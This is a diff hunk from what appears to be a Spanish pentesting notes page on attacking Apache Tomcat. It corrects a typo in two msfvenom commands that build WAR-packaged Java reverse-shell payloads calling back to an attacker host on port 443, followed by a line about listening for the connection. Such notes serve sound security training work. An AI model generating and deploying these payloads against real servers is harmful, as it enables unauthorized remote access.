@@ -242,11 +242,11 @@ En esta página encontramos las credenciales más comunes de Tomcat y cómo vuln
 Dependiendo de la versión del servidor puede funcionar uno u otro.
 
 ```bash
-msfvenom -p java/shell_reverse_tcp LHOST=<IP máquina atcante> LPORT=443 -f war -o reverse1.war
+msfvenom -p java/shell_reverse_tcp LHOST=<IP máquina atacante> LPORT=443 -f war -o reverse1.war
 ```
 
 ```bash
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP máquina atcante> LPORT=443 -f war -o reverse2.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP máquina atacante> LPORT=443 -f war -o reverse2.war
 ```
 
 Nos ponemos en escucha y vemos cual funciona.
